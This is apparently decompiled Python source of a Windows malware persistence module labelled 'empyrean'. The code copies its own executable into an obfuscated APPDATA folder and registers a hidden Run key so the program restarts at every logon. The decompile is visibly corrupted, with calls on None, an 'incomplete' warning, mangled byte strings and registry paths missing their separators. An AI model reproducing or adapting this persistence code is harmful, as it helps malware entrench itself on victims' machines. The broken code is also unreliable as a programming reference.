# pyunpacker v1.0 (by Vault) #

import subprocess
import os
import shutil
import sys

class Startup:
    
    def __init__(self):
        setattr(self, 'working_dir', os.getenv('APPDATA') + __import__('base64').b64decode(__import__('zlib').decompress(b'xxdax8bpx0f+Ixf6xc8xa9x8cnw+x05x00x1cx0cx04f')).decode())
        if self.check_self():
            return None
        None.mkdir()
        self.write_stub()
        self.regedit()

    
    def check_self(self):
        if os.path.realpath(sys.executable) == self.working_dir + 'dat.txt':
            return True

    
    def mkdir(self):
        if not os.path.isdir(self.working_dir):
            os.mkdir(self.working_dir)
            return None
        None.rmtree(self.working_dir)
        os.mkdir(self.working_dir)

    
    def write_stub(self):
        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + 'dat.txt')
    # WARNING: Decompyle incomplete

    
    def regedit(self):
        subprocess.run([
            'reg',
            'delete',
            'HKCUSoftwareMicrosoftWindowsCurrentVersionRun',
            '/v',
            'empyrean',
            '/f'], True, **('args', 'shell'))
        subprocess.run([
            'reg',
            'add',
            'HKCUSoftwareMicrosoftWindowsCurrentVersionRun',
            '/v',
            'empyrean',
            '/t',
            'REG_SZ',
            '/d',
            '{}run.bat'.format(self.working_dir),
            '/f'], True, **('args', 'shell'))


